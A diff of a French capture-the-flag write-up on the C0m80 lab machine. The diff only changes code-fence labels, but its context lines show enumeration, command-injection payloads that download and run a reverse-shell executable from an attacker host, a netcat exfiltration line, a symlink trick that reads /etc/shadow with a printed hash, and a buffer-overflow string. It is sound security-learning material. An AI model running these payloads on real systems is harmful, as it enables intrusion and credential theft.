@@ -11,7 +11,7 @@ Ce CTF a été intéressant, agréable à résoudre tout en étant suffisamment 
 Enumerate all the things
 ------------------------
 
-```plain
+```
 Nmap scan report for 192.168.1.19
 Host is up (0.00085s latency).
 Not shown: 65524 closed ports
@@ -92,7 +92,7 @@ En dehors du serveur web prétendant être IIS 6.0, du serveur Samba (intéressa
 
 Nmap nous donne quelques infos supplémentaires sur SMB :  
 
-```plain
+```
 Host script results:
 |_nbstat: NetBIOS name: C0M80, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
 | smb-os-discovery:
@@ -153,7 +153,7 @@ Et à l'URL */bugs/* (que l'on peut trouver via un crawler ou un buster car il y
 
 Voici d'ailleurs le résultat du module buster de Wapiti :  
 
-```plain
+```
 [*] Launching module buster
 Found webpage http://192.168.1.19/images
 Found webpage http://192.168.1.19/_vti_cnf
@@ -190,7 +190,7 @@ Found webpage http://192.168.1.19/bugs/debug
 
 Aucun des dossiers /bin et /dev ne donnent un listing des fichiers. Toutefois il est tentant de chercher des exécutables dans le dossier bin, ce qui s'avère fructueux :  
 
-```plain
+```
 http://192.168.1.19/bin/ftp.exe - HTTP 200 (675328 bytes, plain)
 ```
 
@@ -255,7 +255,7 @@ $ sudo mount 192.168.1.19:/ftpsvr/bkp /mnt
 
 On trouve sur ce partage un fichier énigmatique :  
 
-```plain
+```
 -rw-r--r-- 1 backup backup 2757002 févr. 11 11:21 ftp104.bkp
 ```
 
@@ -271,7 +271,7 @@ La suite du challenge nous montrera que cette hypothèse est la bonne, en revanc
 
 Pour ce qui est du fichier *.bkp* il s'avère qu'il s'agit d'un export réalisé avec la commande *xxd* avec deux lignes d'entête supplémentaires :  
 
-```plain
+```
 Mon Feb 11 10:19:01 GMT 2018
 ------------------------------------------------------------------
 0000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  (!..............
@@ -308,7 +308,7 @@ Sur *exploit-db*, il y a une vulnérabilité de password-reset qui s'avère prom
 
 Ce qui ressort de cette vulnérabilité et de [la vidéo citée](https://vimeo.com/213144905) c'est tout de même qu'on peut facilement énumérer les utilisateurs existants en incrémentant l'ID dans l'URL suivante (l'auteur du challenge demandait à ce qu'on rajoute une entrée dans le /etc/hosts) :  
 
-```plain
+```
 http://c0m80.ctf/bugs/verify.php?id=1&confirm_hash=
 ```
 
@@ -332,7 +332,7 @@ for i in range(MAX_ID):
 
 Nous ramène une petite liste d'utilisateurs :  
 
-```plain
+```
 Found user id 1: 'bob'
 Found user id 2: 'guest'
 Found user id 3: 'Jeff Deucette'
@@ -355,7 +355,7 @@ Errances
 
 N'ayant toujours pas remarqué le *truc*, j'ai testé différentes choses. Par exemple *enum4linux* m'a trouvé des utilisateurs supplémentaires sur le Samba :  
 
-```plain
+```
 enum4linux
 [+] Enumerating users using SID S-1-22-1 and logon username '', password ''
 S-1-22-1-1000 Unix User\b0b (Local User)
@@ -366,7 +366,7 @@ Je me suis dit que le fichier *.bkp* était peut être un dump mémoire du coup 
 
 J'ai aussi découvert au boût d'un moment que le serveur FTP (port 20021) est accessible sans authentification (quand je pense au temps passé sur le brute force...)  
 
-```plain
+```
 ftp>ls
 200 PORT command successful
 ---> LIST
@@ -470,7 +470,7 @@ On découvre comme ça les commandes cachées *Send-Report* et *Report-Link* mai
 
 Au passage voici l'output de l'une des commandes cachées :  
 
-```plain
+```
 ftp>Send-Report
 AWESOME BOB'S REPORTING FEATURE!
 
@@ -509,7 +509,7 @@ __declspec(dllexport) void EssentialFunc1(void)
 
 Une fois le serveur lancé en local on peut faire notre essai d'injection de commande :  
 
-```plain
+```
 http://www.perdu.com/ & echo PWNED > c:/windows/temp/yolo.txt & notepad c:/windows/temp/yolo.txt &
 ```
 
@@ -517,13 +517,13 @@ http://www.perdu.com/ & echo PWNED > c:/windows/temp/yolo.txt & notepad c:/windo
 
 Dès lors j'ai tenté quelques injections sympas Windows related :  
 
-```plain
+```
 http://perdu.com/ & powershell -c "(New-Object Net.WebClient).DownloadFile('http://192.168.1.3/met_win32_rev_tcp_192_168_1_3_9999.exe', 'shell.exe')" & shell.exe &
 ```
 
 ou profitant de la présence de Python dans le path :  
 
-```plain
+```
 http://www.perdu.com/ & python -c "import urllib;urllib.urlretrieve('http://192.168.1.3/met_win32_rev_tcp_192_168_1_3_9999.exe', 'shell.exe')" & shell.exe &
 ```
 
@@ -540,7 +540,7 @@ Après avoir bien fouillé j'ai trouvé que l'on peut appeler des programmes Uni
 
 Je suppose que l'output des commandes Unix n'est pas sensé passer via la PIPE Windows... quoiqu'il en soit le problème est résolu si on parvient à tout "piper" dans une même commande Unix :  
 
-```plain
+```
 ftp>http: & start /unix /usr/bin/python -c "import os;os.system('id | netcat 192.168.1.6 7777')"
 BugReport Link Sent to Bob...
 ```
@@ -561,7 +561,7 @@ On trouve une clé privée SSH pour l'utilisateur. D'ailleurs un serveur SSH est
 
 *b0b* dispose de plusieurs fichiers dans son *Desktop/* qui sont respectivement *notes.txt*, *pwds.txt* et *.save~* dont voici les contenus :  
 
-```plain
+```
 These are my notes...
 ---------------------
 I prefer the old fasioned ways of doing things if I'm honest
@@ -575,12 +575,12 @@ I prefer the old fasioned ways of doing things if I'm honest
 4. Draft a resignation letter as Jeff to send to Mr Cheong. LOL :D
 ```
 
-```plain
+```
 ## Reminder to self!
 I moved all my passwords to a new password manager
 ```
 
-```plain
+```
 ## Reminder to self!
 Get a password manager!
 
@@ -589,7 +589,7 @@ VNC-PASS:Al1ce1smyB3stfi3nd$12345qwert
 
 On trouve un autre fichier *.save~* dans le dossier *.ssh* :  
 
-```plain
+```
 ###### NO PASWORD HERE SRY ######
 
 I'm using my new password manager
@@ -646,7 +646,7 @@ Même si on monte le partage en root pour placer un binaire setuid 0, il faudrai
 
 Le script shell ne nous offre pas grand chose puisqu'il tourne en tant que b0b :  
 
-```plain
+```
 #!/bin/bash
 while true
 do
@@ -656,7 +656,7 @@ done
 
 Par contre al1ce dispose des bons droits :  
 
-```plain
+```
 uid=1001(al1ce) gid=34(backup) groups=34(backup)
 ```
 
@@ -669,13 +669,13 @@ ssh-rsa AAAAB3NzaC--- snip nevermind ---tB9qKxMKM3x b0b@C0m80
 
 Mais même après avoir recopié un client SSH (puisqu’il a été supprimé ici) pris sur une Ubuntu 32bits on obtient un message d'erreur :  
 
-```plain
+```
 Agent admitted failure to sign using the key.
 ```
 
 Et après quelques recherches si on essaye de bypasser ça avec la commande suivante :  
 
-```plain
+```
 SSH_AUTH_SOCK=0 ./ssh -p 65122 al1ce@localhost
 ```
 
@@ -696,7 +696,7 @@ makebkp
 
 Cela fait référence à un binaire setuid :  
 
-```plain
+```
 ---S--S--x 1 root backup 7382 Sep 23 01:54 /usr/local/bin/makebkp
 ```
 
@@ -704,7 +704,7 @@ Comme on s'y attend c'est ce programme qui fait un xxd de */ftpsvr/bestFTPserver
 
 Comme on a les droits sur */ftpsvr* on peut supprimer *bestFTPserver.exe* et le réutiliser comme lien symbolique vers un fichier quelconque du système, permettant ainsi d'obtenir son contenu, comme */etc/shadow* :  
 
-```plain
+```
 root:*:17432:0:99999:7:::
 b0b:$6$m67feRp8$mX2RwnX4Q2kB6bdsIbDHQiSnTkrEX3tGRd2qvoys03fyxcJ1022Gzedx0Atj3hhFxcBX.w43tSEUQ6oZZQZQ2.:17432:0:99999:7:::
 al1ce:!:17431:0:99999:7:::
@@ -889,7 +889,7 @@ La Structure de la pile ressemble à ça :
 
 On commence par faire un test simple en passant la commande suivante :  
 
-```plain
+```
 cd .&calc&BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL
 ```
 
@@ -897,7 +897,7 @@ Ce qui nous vaut une redirection de l'exécution sur 0x4C4C4C4C (ce qui correspo
 
 Et avec l'exploit suivant :  
 
-```plain
+```
 cd .&calc&BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK\x1c\x4x\x40\x00
 ```
 
